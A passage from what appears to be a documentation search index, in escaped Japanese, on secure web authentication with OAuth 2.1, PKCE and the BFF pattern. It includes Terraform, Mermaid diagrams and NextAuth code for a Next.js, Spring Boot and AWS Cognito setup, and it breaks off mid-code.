<li>NextAuth/Auth.js\u3067\u7c21\u5358\u7d71\u5408</li> <li>Spring Security\u306eOAuth2\u81ea\u52d5\u8a2d\u5b9a</li> <li>AWS CDK/Terraform\u3067\u30a4\u30f3\u30d5\u30e9\u30b3\u30fc\u30c9\u5316</li> <li>\u8c4a\u5bcc\u306a\u30a8\u30b3\u30b7\u30b9\u30c6\u30e0\u3068\u30b3\u30df\u30e5\u30cb\u30c6\u30a3</li> </ol>"},{"location":"authentication-guide/#_51","title":"\u26a0\ufe0f \u6ce8\u610f\u3059\u3079\u304d\u843d\u3068\u3057\u7a74","text":"<ol> <li>\u30b3\u30b9\u30c8: Cognito\u306e\u6599\u91d1\u4f53\u7cfb(MAU\u8ab2\u91d1\u300150,000 MAU\u307e\u3067\u7121\u6599)</li> <li>\u30ed\u30c3\u30af\u30a4\u30f3: AWS\u4f9d\u5b58\u5ea6\u304c\u9ad8\u3044(\u79fb\u884c\u30b3\u30b9\u30c8)</li> <li>\u8907\u96d1\u6027: 3\u5c64\u69cb\u9020\u306e\u30c7\u30d0\u30c3\u30b0\u306e\u96e3\u3057\u3055\u3001\u5206\u6563\u30c8\u30ec\u30fc\u30b7\u30f3\u30b0\u5fc5\u9808</li> <li>\u30ec\u30a4\u30c6\u30f3\u30b7: BFF\u7d4c\u7531\u306e\u30aa\u30fc\u30d0\u30fc\u30d8\u30c3\u30c9(\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0\u6226\u7565\u3067\u7de9\u548c)</li> <li>\u30ea\u30fc\u30b8\u30e7\u30f3\u5236\u7d04: Cognito\u306e\u4e00\u90e8\u6a5f\u80fd\u304c\u30ea\u30fc\u30b8\u30e7\u30f3\u9650\u5b9a</li> <li>\u30ab\u30b9\u30bf\u30de\u30a4\u30ba\u9650\u754c: Cognito Hosted UI\u306e\u30ab\u30b9\u30bf\u30de\u30a4\u30ba\u5236\u7d04</li> </ol>"},{"location":"authentication-guide/#_52","title":"\ud83d\ude80 \u63a8\u5968\u3055\u308c\u308b\u6b21\u306e\u30b9\u30c6\u30c3\u30d7","text":"<p>\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5f37\u5316:</p> <ol> <li>PAR/JAR/JARM\u306e\u5c0e\u5165\u691c\u8a0e(\u9ad8\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u8981\u4ef6\u6642)</li> <li>DPoP\u306b\u3088\u308b\u30c8\u30fc\u30af\u30f3\u30d0\u30a4\u30f3\u30c7\u30a3\u30f3\u30b0</li> <li>Shared Signals/CAEP\u3067\u30ea\u30a2\u30eb\u30bf\u30a4\u30e0\u30bb\u30c3\u30b7\u30e7\u30f3\u7ba1\u7406</li> <li>FedCM\u5bfe\u5fdc(\u5c06\u6765\u306e\u30d6\u30e9\u30a6\u30b6\u6a19\u6e96)</li> </ol> <p>\u904b\u7528\u6539\u5584: 5. Cognito\u306e\u30ab\u30b9\u30bf\u30e0\u30af\u30ec\u30fc\u30e0\u3092\u6d3b\u7528\u3057\u305f\u7d30\u304b\u3044\u6a29\u9650\u5236\u5fa1 6. Cognito\u30b0\u30eb\u30fc\u30d7\u6a5f\u80fd\u3067\u30ed\u30fc\u30eb\u7ba1\u7406(RBAC) 7. AWS WAF + Shield Advanced\u3067 DDoS\u5bfe\u7b56 8. CloudWatch/X-Ray/OpenTelemetry\u3067\u76e3\u8996\u30fb\u30c8\u30ec\u30fc\u30b7\u30f3\u30b0 9. Chaos Engineering/\u969c\u5bb3\u30c6\u30b9\u30c8</p> <p>UX\u6539\u5584: 10. \u30d1\u30b9\u30ad\u30fc(WebAuthn)\u306e\u7a4d\u6975\u5c0e\u5165 11. \u30a2\u30c0\u30d7\u30c6\u30a3\u30d6\u8a8d\u8a3c\u306b\u3088\u308b\u30b7\u30fc\u30e0\u30ec\u30b9\u306aMFA 12. \u30bd\u30fc\u30b7\u30e3\u30eb\u30ed\u30b0\u30a4\u30f3\u62e1\u5145 13. \u30a2\u30ab\u30a6\u30f3\u30c8\u30ea\u30f3\u30af\u6a5f\u80fd(\u8907\u6570IdP\u7d71\u5408)</p> <p>\u958b\u767a\u30d7\u30ed\u30bb\u30b9: 14. E2E\u30c6\u30b9\u30c8\u81ea\u52d5\u5316(Playwright/Cypress + Cognito Local) 15. \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30c6\u30b9\u30c8\u81ea\u52d5\u5316(OWASP ZAP) 16. CI/CD\u30d1\u30a4\u30d7\u30e9\u30a4\u30f3\u306e\u5f37\u5316 17. \u30d6\u30eb\u30fc\u30b0\u30ea\u30fc\u30f3\u30c7\u30d7\u30ed\u30a4/\u30ab\u30ca\u30ea\u30a2\u30ea\u30ea\u30fc\u30b9</p>"},{"location":"authentication-guide/#_53","title":"\u53c2\u8003\u30ea\u30bd\u30fc\u30b9","text":""},{"location":"authentication-guide/#rfc","title":"\u6a19\u6e96\u4ed5\u69d8\u30fbRFC","text":"<ul> <li>OAuth 2.0 RFC 6749</li> <li>OAuth 2.1 Draft</li> <li>PKCE RFC 7636</li> <li>OpenID Connect Core 1.0</li> <li>DPoP RFC 9449</li> <li>PAR RFC 9126</li> </ul>"},{"location":"authentication-guide/#_54","title":"\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30ac\u30a4\u30c9\u30e9\u30a4\u30f3","text":"<ul> <li>OWASP Authentication Cheat Sheet</li> <li>NIST 800-63B Digital Identity Guidelines</li> <li>FAPI Security Profile</li> <li>OAuth 2.0 Security Best Current Practice</li> </ul>"},{"location":"authentication-guide/#_55","title":"\u30d5\u30ec\u30fc\u30e0\u30ef\u30fc\u30af\u30fb\u30e9\u30a4\u30d6\u30e9\u30ea","text":"<ul> <li>NextAuth.js / Auth.js Documentation</li> <li>Spring Security OAuth 2.0</li> <li>AWS Cognito Developer Guide</li> <li>WebAuthn Guide</li> </ul>"},{"location":"authentication-guide/#_56","title":"\u6700\u65b0\u60c5\u5831","text":"<ul> <li>OAuth Working Group</li> <li>OpenID Foundation</li> <li>FedCM (Federated Credential Management)</li> </ul>"},{"location":"authentication-guide/#2025_4","title":"2025\u5e74\u306e\u8a8d\u8a3c\u5b9f\u88c5\u307e\u3068\u3081","text":""},{"location":"authentication-guide/#_57","title":"\u6700\u91cd\u8981\u30dd\u30a4\u30f3\u30c8","text":"<ol> <li>BFF\u30d1\u30bf\u30fc\u30f3 + Authorization Code + PKCE \u304c\u5b9f\u52d9\u4e0a\u306e\u5b89\u5b9a\u89e3</li> <li>\u30d1\u30b9\u30ad\u30fc(WebAuthn) \u3092\u7b2c\u4e00\u9078\u629e\u306eMFA\u306b</li> <li>Implicit Flow / ROPC \u306f\u4f7f\u7528\u7981\u6b62 (OAuth 2.1\u3067\u5ec3\u6b62)</li> <li>\u30b5\u30fc\u30c9\u30d1\u30fc\u30c6\u30a3Cookie\u975e\u4f9d\u5b58 \u306e\u8a2d\u8a08(FedCM\u691c\u8a0e)</li> <li>\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u30ed\u30fc\u30c6\u30fc\u30b7\u30e7\u30f3 \u5fc5\u9808</li> <li>\u30c8\u30fc\u30af\u30f3\u77ed\u5bff\u547d\u5316 + \u30d0\u30a4\u30f3\u30c7\u30a3\u30f3\u30b0(DPoP/mTLS)</li> <li>\u30ea\u30b9\u30af\u30d9\u30fc\u30b9/\u30a2\u30c0\u30d7\u30c6\u30a3\u30d6\u8a8d\u8a3c \u3067UX\u3068\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u4e21\u7acb</li> </ol>"},{"location":"authentication-guide/#_58","title":"\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3\u9078\u629e\u306e\u6307\u91dd","text":"\u30e6\u30fc\u30b9\u30b1\u30fc\u30b9 \u63a8\u5968\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3 \u8a8d\u8a3c\u65b9\u5f0f \u30d5\u30eb\u30b9\u30bf\u30c3\u30af\u30a2\u30d7\u30ea Next.js SSR \u30bb\u30c3\u30b7\u30e7\u30f3 + OIDC SPA + API BFF\u30d1\u30bf\u30fc\u30f3 Authorization Code + PKCE \u30e2\u30d0\u30a4\u30eb\u30a2\u30d7\u30ea \u30cd\u30a4\u30c6\u30a3\u30d6 + API Authorization Code + PKCE (\u30b7\u30b9\u30c6\u30e0\u30d6\u30e9\u30a6\u30b6) \u30a8\u30f3\u30bf\u30fc\u30d7\u30e9\u30a4\u30ba SSO\u7d71\u5408 OIDC / SAML 2.0 M2M API\u9593\u901a\u4fe1 Client Credentials + mTLS"},{"location":"authentication-guide/#_59","title":"\u30ec\u30ac\u30b7\u30fc\u304b\u3089\u306e\u79fb\u884c","text":"<p>\u5f93\u6765\u306e\u30bb\u30c3\u30b7\u30e7\u30f3\u30d9\u30fc\u30b9\u3084Implicit Flow\u4f7f\u7528\u30a2\u30d7\u30ea\u306f\u3001\u4ee5\u4e0b\u306e\u6bb5\u968e\u7684\u79fb\u884c\u3092\u63a8\u5968:</p> <ol> <li>Phase 1: PKCE\u8ffd\u52a0\u3001state/nonce\u5fc5\u9808\u5316</li> <li>Phase 2: BFF\u30d1\u30bf\u30fc\u30f3\u5c0e\u5165\u3001\u30c8\u30fc\u30af\u30f3\u7ba1\u7406\u306e\u30b5\u30fc\u30d0\u30fc\u5074\u79fb\u884c</li> <li>Phase 3: \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u30ed\u30fc\u30c6\u30fc\u30b7\u30e7\u30f3\u5b9f\u88c5</li> <li>Phase 4: WebAuthn/\u30d1\u30b9\u30ad\u30fc\u5c0e\u5165</li> <li>Phase 5: PAR/DPoP\u7b49\u306e\u9ad8\u5ea6\u306a\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u6a5f\u80fd\u8ffd\u52a0</li> </ol> <p>\u4f5c\u6210\u65e5: 2025\u5e7410\u670815\u65e5 \u6700\u7d42\u66f4\u65b0: 2025\u5e7410\u670815\u65e5 \u5bfe\u8c61\u8aad\u8005: Web\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u958b\u767a\u521d\u5fc3\u8005\u301c\u4e2d\u7d1a\u8005 \u60f3\u5b9a\u69cb\u6210: Next.js + Spring Boot + AWS Cognito \u6e96\u62e0\u6a19\u6e96: OAuth 2.1, OIDC, NIST 800-63B, OWASP</p> <p><sub>[\u30ad\u30fc\u30ef\u30fc\u30c9] <p>Web\u8a8d\u8a3c 2025, BFF\u30d1\u30bf\u30fc\u30f3, OAuth 2.1, PKCE, \u30d1\u30b9\u30ad\u30fc, WebAuthn, \u30b5\u30fc\u30c9\u30d1\u30fc\u30c6\u30a3Cookie, DPoP, \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u30ed\u30fc\u30c6\u30fc\u30b7\u30e7\u30f3, Next.js\u8a8d\u8a3c, AWS Cognito, Spring Security, OIDC, \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30d9\u30b9\u30c8\u30d7\u30e9\u30af\u30c6\u30a3\u30b9</p>"},{"location":"implementation-guide/","title":"Next.js + Spring Boot + AWS Cognito \u8a8d\u8a3c\u5b9f\u88c5\u30ac\u30a4\u30c9","text":"<p>\ud83d\udcd8 \u8a8d\u8a3c\u30fb\u8a8d\u53ef &gt; \u5b9f\u88c5\u30ac\u30a4\u30c9 \u672c\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u3067\u306f\u3001Next.js + Spring Boot + AWS Cognito \u3092\u4f7f\u3063\u305f\u8a8d\u8a3c\u6a5f\u80fd\u306e\u5b9f\u88c5\u65b9\u6cd5\u3092\u89e3\u8aac\u3057\u307e\u3059\u3002BFF\u30d1\u30bf\u30fc\u30f3\u306b\u3088\u308b\u5b9f\u88c5\u3001\u901a\u4fe1\u30d5\u30ed\u30fc\u306e\u8a73\u7d30\u3001\u5177\u4f53\u7684\u306a\u30b3\u30fc\u30c9\u4f8b\u3092\u63d0\u4f9b\u3057\u307e\u3059\u3002</p>"},{"location":"implementation-guide/#_1","title":"\u524d\u63d0\u77e5\u8b58","text":"<p>\u4ee5\u4e0b\u306e\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u3092\u5148\u306b\u8aad\u3080\u3053\u3068\u3092\u63a8\u5968\u3057\u307e\u3059:</p> <ol> <li>\u6982\u8981 - \u8a8d\u8a3c\u3068\u8a8d\u53ef\u306e\u57fa\u790e</li> <li>OAuth 2.0 / OIDC - \u30d7\u30ed\u30c8\u30b3\u30eb\u306e\u8a73\u7d30</li> <li>\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5bfe\u7b56 - \u8105\u5a01\u3068\u5bfe\u7b56</li> </ol>"},{"location":"implementation-guide/#_2","title":"\u95a2\u9023\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8","text":"<ul> <li>\u8a73\u7d30: \u5305\u62ec\u7684\u30ea\u30d5\u30a1\u30ec\u30f3\u30b9 - \u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3\u30d1\u30bf\u30fc\u30f3\u3001\u6700\u65b0\u6280\u8853</li> </ul>"},{"location":"implementation-guide/#_3","title":"\u76ee\u6b21","text":"<ol> <li>\u30b7\u30b9\u30c6\u30e0\u69cb\u6210</li> <li>\u8a8d\u8a3c\u30d5\u30ed\u30fc\u5168\u4f53\u50cf</li> <li>\u5b9f\u88c5: AWS Cognito \u8a2d\u5b9a</li> <li>\u5b9f\u88c5: Next.js(BFF)</li> <li>\u5b9f\u88c5: Spring Boot API</li> <li>\u88dc\u8db3: \u30c8\u30fc\u30af\u30f3\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5</li> <li>\u88dc\u8db3: \u30a8\u30e9\u30fc\u30cf\u30f3\u30c9\u30ea\u30f3\u30b0</li> <li>\u307e\u3068\u3081\u3068\u30c1\u30a7\u30c3\u30af\u30ea\u30b9\u30c8</li> </ol>"},{"location":"implementation-guide/#_4","title":"\u30b7\u30b9\u30c6\u30e0\u69cb\u6210","text":""},{"location":"implementation-guide/#bff","title":"\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3\u56f3(BFF\u30d1\u30bf\u30fc\u30f3)","text":"<pre><code>graph TB\n    Browser[\ud83c\udf10 \u30d6\u30e9\u30a6\u30b6&lt;br/&gt;React/Next.js UI]\n    NextJS[\u26a1 Next.js Server&lt;br/&gt;BFF Backend for Frontend&lt;br/&gt;\u30fb\u30c8\u30fc\u30af\u30f3\u7ba1\u7406&lt;br/&gt;\u30fb\u30d7\u30ed\u30ad\u30b7]\n    Cognito[\ud83d\udd10 AWS Cognito&lt;br/&gt;Identity Provider&lt;br/&gt;\u30fb\u8a8d\u8a3c&lt;br/&gt;\u30fbMFA&lt;br/&gt;\u30fb\u30c8\u30fc\u30af\u30f3\u767a\u884c]\n    SpringBoot[\u2615 Spring Boot&lt;br/&gt;API Server&lt;br/&gt;\u30fb\u30d3\u30b8\u30cd\u30b9\u30ed\u30b8\u30c3\u30af&lt;br/&gt;\u30fb\u30c8\u30fc\u30af\u30f3\u691c\u8a3c]\n    DB[(\ud83d\udcbe Database)]\n\n    Browser &lt;--&gt;|\u2460 Cookie&lt;br/&gt;HttpOnly/Secure| NextJS\n    NextJS &lt;--&gt;|\u2461 OAuth 2.0&lt;br/&gt;Code+PKCE| Cognito\n    NextJS --&gt;|\u2462 Bearer Token&lt;br/&gt;ID\u30c8\u30fc\u30af\u30f3| SpringBoot\n    SpringBoot --&gt; DB\n\n    style NextJS fill:#e1f5ff\n    style Cognito fill:#fff3e0\n    style SpringBoot fill:#e8f5e9</code></pre>"},{"location":"implementation-guide/#_5","title":"\u5404\u30b3\u30f3\u30dd\u30fc\u30cd\u30f3\u30c8\u306e\u5f79\u5272","text":"\u30b3\u30f3\u30dd\u30fc\u30cd\u30f3\u30c8 \u5f79\u5272 \u6280\u8853\u30b9\u30bf\u30c3\u30af \u30d6\u30e9\u30a6\u30b6 UI\u8868\u793a\u3001\u30e6\u30fc\u30b6\u30fc\u64cd\u4f5c React, TypeScript Next.js(BFF) \u30fb\u8a8d\u8a3c\u30d5\u30ed\u30fc\u7ba1\u7406\u30fb\u30c8\u30fc\u30af\u30f3\u7ba1\u7406(\u30b5\u30fc\u30d0\u30fc\u5074)\u30fbAPI \u30d7\u30ed\u30ad\u30b7 Next.js 14+, NextAuth AWS Cognito \u30fb\u8a8d\u8a3c\u30fb\u8a8d\u53ef\u30fb\u30c8\u30fc\u30af\u30f3\u767a\u884c\u30fbMFA AWS Cognito User Pool Spring Boot \u30fb\u30d3\u30b8\u30cd\u30b9\u30ed\u30b8\u30c3\u30af\u30fb\u30c7\u30fc\u30bf\u30a2\u30af\u30bb\u30b9\u30fb\u30c8\u30fc\u30af\u30f3\u691c\u8a3c Spring Boot 3.x, Spring Security"},{"location":"implementation-guide/#bff_1","title":"\u306a\u305cBFF\u30d1\u30bf\u30fc\u30f3\u306a\u306e\u304b\uff1f","text":"<p>2025\u5e74\u306e\u5fc5\u9808\u8981\u4ef6:</p> <ul> <li>\u2705 \u30b5\u30fc\u30c9\u30d1\u30fc\u30c6\u30a3Cookie\u5ec3\u6b62\u3078\u306e\u5bfe\u5fdc</li> <li>\u2705 \u30c8\u30fc\u30af\u30f3\u3092\u30d6\u30e9\u30a6\u30b6\u306b\u9732\u51fa\u3055\u305b\u306a\u3044(XSS\u5bfe\u7b56)</li> <li>\u2705 CORS\u8a2d\u5b9a\u304c\u30b7\u30f3\u30d7\u30eb</li> <li>\u2705 \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u3092\u5b89\u5168\u306b\u7ba1\u7406</li> </ul>"},{"location":"implementation-guide/#_6","title":"\u8a8d\u8a3c\u30d5\u30ed\u30fc\u5168\u4f53\u50cf","text":""},{"location":"implementation-guide/#1","title":"1. \u521d\u56de\u30ed\u30b0\u30a4\u30f3\u30d5\u30ed\u30fc","text":"<pre><code>sequenceDiagram\n    autonumber\n    participant Browser as \ud83c\udf10 \u30d6\u30e9\u30a6\u30b6\n    participant Next as \u26a1 Next.js BFF\n    participant Cognito as \ud83d\udd10 AWS Cognito\n    participant Spring as \u2615 Spring Boot\n\n    Browser-&gt;&gt;Next: \u30ed\u30b0\u30a4\u30f3\u30dc\u30bf\u30f3\u30af\u30ea\u30c3\u30af\n    Note over Next: code_verifier\u751f\u6210(PKCE)\n    Next-&gt;&gt;Cognito: \u8a8d\u53ef\u30ea\u30af\u30a8\u30b9\u30c8&lt;br/&gt;(response_type=code, code_challenge, state)\n    Cognito-&gt;&gt;Browser: \u30ed\u30b0\u30a4\u30f3\u753b\u9762\u8868\u793a\n    Browser-&gt;&gt;Cognito: \u8a8d\u8a3c\u60c5\u5831\u5165\u529b(email/password)\n    Cognito-&gt;&gt;Cognito: \u8a8d\u8a3c\u6210\u529f\n    Cognito-&gt;&gt;Next: \u8a8d\u53ef\u30b3\u30fc\u30c9\u8fd4\u5374(redirect)\n    Note over Next: state\u691c\u8a3c\n    Next-&gt;&gt;Cognito: \u30c8\u30fc\u30af\u30f3\u8981\u6c42&lt;br/&gt;(code, code_verifier)\n    Cognito-&gt;&gt;Cognito: PKCE\u691c\u8a3c\n    Cognito-&gt;&gt;Next: ID\u30c8\u30fc\u30af\u30f3&lt;br/&gt;\u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3&lt;br/&gt;\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\n    Note over Next: \u30c8\u30fc\u30af\u30f3\u3092\u30b5\u30fc\u30d0\u30fc\u30bb\u30c3\u30b7\u30e7\u30f3\u306b\u4fdd\u5b58\n    Next-&gt;&gt;Browser: \u30bb\u30c3\u30b7\u30e7\u30f3Cookie\u8a2d\u5b9a&lt;br/&gt;(HttpOnly/Secure/SameSite)\n    Browser-&gt;&gt;Next: API\u30ea\u30af\u30a8\u30b9\u30c8&lt;br/&gt;(Cookie\u81ea\u52d5\u9001\u4fe1)\n    Next-&gt;&gt;Next: \u30bb\u30c3\u30b7\u30e7\u30f3\u304b\u3089ID\u30c8\u30fc\u30af\u30f3\u53d6\u5f97\n    Next-&gt;&gt;Spring: ID\u30c8\u30fc\u30af\u30f3\u4ed8\u304d\u30ea\u30af\u30a8\u30b9\u30c8&lt;br/&gt;(Authorization: Bearer xxx)\n    Spring-&gt;&gt;Spring: JWT\u691c\u8a3c&lt;br/&gt;(\u7f72\u540d\u3001issuer\u3001exp\u3001aud)\n    Spring-&gt;&gt;Next: \u30c7\u30fc\u30bf\u8fd4\u5374\n    Next-&gt;&gt;Browser: \u30ec\u30b9\u30dd\u30f3\u30b9</code></pre>"},{"location":"implementation-guide/#_7","title":"\u30d5\u30ed\u30fc\u306e\u30dd\u30a4\u30f3\u30c8","text":""},{"location":"implementation-guide/#1-nextjs","title":"\u2460 \u30d6\u30e9\u30a6\u30b6 \u2192 Next.js","text":"<ul> <li>Cookie: HttpOnly/Secure/SameSite=Strict</li> <li>\u30e1\u30ea\u30c3\u30c8: XSS\u653b\u6483\u3067\u30c8\u30fc\u30af\u30f3\u304c\u76d7\u307e\u308c\u306a\u3044</li> </ul>"},{"location":"implementation-guide/#2-nextjs-cognito-authorization-code-pkce","title":"\u2461 Next.js \u2192 Cognito (Authorization Code + PKCE)","text":"<ul> <li>PKCE: \u8a8d\u53ef\u30b3\u30fc\u30c9\u6a2a\u53d6\u308a\u653b\u6483\u3092\u9632\u6b62</li> <li>state: CSRF\u653b\u6483\u3092\u9632\u6b62</li> <li>OAuth 2.1\u6e96\u62e0: Implicit Flow \u306f\u5ec3\u6b62</li> </ul>"},{"location":"implementation-guide/#3-nextjs-spring-boot","title":"\u2462 Next.js \u2192 Spring Boot","text":"<ul> <li>Bearer Token: ID\u30c8\u30fc\u30af\u30f3\u307e\u305f\u306f\u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3</li> <li>BFF\u304c\u4ef2\u4ecb: \u30c8\u30fc\u30af\u30f3\u306f\u30d6\u30e9\u30a6\u30b6\u306b\u5c4a\u304b\u306a\u3044</li> </ul>"},{"location":"implementation-guide/#2-api","title":"2. \u901a\u5e38\u306eAPI\u30a2\u30af\u30bb\u30b9\u30d5\u30ed\u30fc","text":"<pre><code>sequenceDiagram\n    autonumber\n    participant Browser as \ud83c\udf10 \u30d6\u30e9\u30a6\u30b6\n    participant Next as \u26a1 Next.js BFF\n    participant Spring as \u2615 Spring Boot\n\n    Browser-&gt;&gt;Next: GET /api/users/profile&lt;br/&gt;(Cookie\u81ea\u52d5\u9001\u4fe1)\n    Next-&gt;&gt;Next: \u30bb\u30c3\u30b7\u30e7\u30f3\u304b\u3089ID\u30c8\u30fc\u30af\u30f3\u53d6\u5f97\n    alt \u30c8\u30fc\u30af\u30f3\u6709\u52b9\n        Next-&gt;&gt;Spring: GET /users/profile&lt;br/&gt;Authorization: Bearer {ID\u30c8\u30fc\u30af\u30f3}\n        Spring-&gt;&gt;Spring: JWT\u691c\u8a3c(\u7f72\u540d\u3001exp\u7b49)\n        Spring-&gt;&gt;Next: \u30e6\u30fc\u30b6\u30fc\u60c5\u5831\n        Next-&gt;&gt;Browser: \u30ec\u30b9\u30dd\u30f3\u30b9\n    else \u30c8\u30fc\u30af\u30f3\u671f\u9650\u5207\u308c\n        Next-&gt;&gt;Next: \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30d5\u30ed\u30fc\u5b9f\u884c\n        Note over Next: (\u8a73\u7d30\u306f\u5f8c\u8ff0)\n        Next-&gt;&gt;Spring: \u65b0\u3057\u3044ID\u30c8\u30fc\u30af\u30f3\u3067\u30ea\u30c8\u30e9\u30a4\n        Spring-&gt;&gt;Next: \u30e6\u30fc\u30b6\u30fc\u60c5\u5831\n        Next-&gt;&gt;Browser: \u30ec\u30b9\u30dd\u30f3\u30b9\n    end</code></pre>"},{"location":"implementation-guide/#aws-cognito","title":"\u5b9f\u88c5: AWS Cognito \u8a2d\u5b9a","text":""},{"location":"implementation-guide/#1_1","title":"1. \u30e6\u30fc\u30b6\u30fc\u30d7\u30fc\u30eb\u4f5c\u6210","text":"<pre><code># Terraform example\nresource \"aws_cognito_user_pool\" \"main\" {\n  name = \"myapp-user-pool\"\n\n  # \u30d1\u30b9\u30ef\u30fc\u30c9\u30dd\u30ea\u30b7\u30fc(NIST 800-63B\u6e96\u62e0)\n  password_policy {\n    minimum_length    = 12\n    require_lowercase = true\n    require_uppercase = true\n    require_numbers   = true\n    require_symbols   = true\n  }\n\n  # MFA\u8a2d\u5b9a\n  mfa_configuration = \"OPTIONAL\"\n\n  software_token_mfa_configuration {\n    enabled = true  # TOTP(Authenticator)\n  }\n\n  # \u30e1\u30fc\u30eb\u691c\u8a3c\n  auto_verified_attributes = [\"email\"]\n\n  # Advanced Security(\u7570\u5e38\u691c\u77e5\u3001\u30ea\u30b9\u30af\u30d9\u30fc\u30b9\u8a8d\u8a3c)\n  user_pool_add_ons {\n    advanced_security_mode = \"ENFORCED\"\n  }\n\n  # \u30a2\u30ab\u30a6\u30f3\u30c8\u56de\u5fa9\n  account_recovery_setting {\n    recovery_mechanism {\n      name     = \"verified_email\"\n      priority = 1\n    }\n  }\n}\n</code></pre>"},{"location":"implementation-guide/#2","title":"2. \u30a2\u30d7\u30ea\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u4f5c\u6210","text":"<pre><code>resource \"aws_cognito_user_pool_client\" \"nextjs\" {\n  name         = \"nextjs-client\"\n  user_pool_id = aws_cognito_user_pool.main.id\n\n  # \u274c Implicit Flow \u306f\u4f7f\u7528\u7981\u6b62\n  # \u2705 Authorization Code \u306e\u307f\n  allowed_oauth_flows                  = [\"code\"]\n  allowed_oauth_flows_user_pool_client = true\n\n  # \u30b9\u30b3\u30fc\u30d7\n  allowed_oauth_scopes = [\n    \"openid\",\n    \"email\",\n    \"profile\",\n    \"aws.cognito.signin.user.admin\"\n  ]\n\n  # \u30b3\u30fc\u30eb\u30d0\u30c3\u30afURL(\u5b8c\u5168\u4e00\u81f4\u5fc5\u9808)\n  callback_urls = [\n    \"http://localhost:3000/api/auth/callback/cognito\",\n    \"https://yourapp.com/api/auth/callback/cognito\"\n  ]\n\n  logout_urls = [\n    \"http://localhost:3000\",\n    \"https://yourapp.com\"\n  ]\n\n  # \u30c8\u30fc\u30af\u30f3\u6709\u52b9\u671f\u9650(2025\u5e74\u63a8\u5968)\n  access_token_validity  = 1   # 1\u6642\u9593\n  id_token_validity      = 1   # 1\u6642\u9593\n  refresh_token_validity = 30  # 30\u65e5\n\n  token_validity_units {\n    access_token  = \"hours\"\n    id_token      = \"hours\"\n    refresh_token = \"days\"\n  }\n\n  # PKCE\u5bfe\u5fdc\n  explicit_auth_flows = [\n    \"ALLOW_REFRESH_TOKEN_AUTH\",\n    \"ALLOW_USER_SRP_AUTH\"\n  ]\n\n  # \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\n  prevent_user_existence_errors = \"ENABLED\"\n  enable_token_revocation       = true  # \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u30ed\u30fc\u30c6\u30fc\u30b7\u30e7\u30f3\n}\n</code></pre>"},{"location":"implementation-guide/#3","title":"3. \u8a2d\u5b9a\u60c5\u5831\u306e\u78ba\u8a8d","text":"<pre><code># \u30e6\u30fc\u30b6\u30fc\u30d7\u30fc\u30ebID\nUser Pool ID: ap-northeast-1_xxxxxxxxx\n\n# \u30a2\u30d7\u30ea\u30af\u30e9\u30a4\u30a2\u30f3\u30c8ID\nClient ID: xxxxxxxxxxxxxxxxxxxx\n\n# Issuer URL(ID\u30c8\u30fc\u30af\u30f3\u691c\u8a3c\u7528)\nIssuer: https://cognito-idp.ap-northeast-1.amazonaws.com/ap-northeast-1_xxxxxxxxx\n\n# JWKs URL(\u516c\u958b\u9375\u53d6\u5f97)\nJWKS URI: https://cognito-idp.ap-northeast-1.amazonaws.com/ap-northeast-1_xxxxxxxxx/.well-known/jwks.json\n</code></pre>"},{"location":"implementation-guide/#nextjsbff","title":"\u5b9f\u88c5: Next.js(BFF)","text":""},{"location":"implementation-guide/#1-nextauth","title":"1. NextAuth \u8a2d\u5b9a","text":"<pre><code># \u30d1\u30c3\u30b1\u30fc\u30b8\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\nnpm install next-auth\n</code></pre> <pre><code>// app/api/auth/[...nextauth]/route.ts\nimport NextAuth from \"next-auth\";\nimport CognitoProvider from \"next-auth/providers/cognito\";\n\nexport const authOptions = {\n  providers: [\n    CognitoProvider({\n      clientId: process.env.COGNITO_CLIENT_ID!,\n      clientSecret: process.env.COGNITO_CLIENT_SECRET!,\n      issuer: process.env.COGNITO_ISSUER!,\n      // PKCE + state \u81ea\u52d5\u8a2d\u5b9a\n      checks: [\"pkce\", \"state\"],\n    })\n  ],\n\n  session: {\n    strategy: \"jwt\",  // \u30b9\u30c6\u30fc\u30c8\u30ec\u30b9\n    maxAge: 30 * 24 * 60 * 60, // 30\u65e5\n  },\n\n  callbacks: {\n    // \u30c8\u30fc\u30af\u30f3\u3092\u30bb\u30c3\u30b7\u30e7\u30f3\u306b\u4fdd\u5b58\n    async jwt({ token, account, profile }) {\n      if (account) {\n        token.accessToken = account.access_token;\n        token.idToken = account.id_token;\n        token.refreshToken = account.refresh_token;\n        token.expiresAt = account.expires_at;\n        token.sub = profile?.sub;\n      }\n      return token;\n    },\n\n    // \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u5074\u3067\u4f7f\u7528\u3059\u308b\u30bb\u30c3\u30b7\u30e7\u30f3\u60c5\u5831\n    async session({ session, token 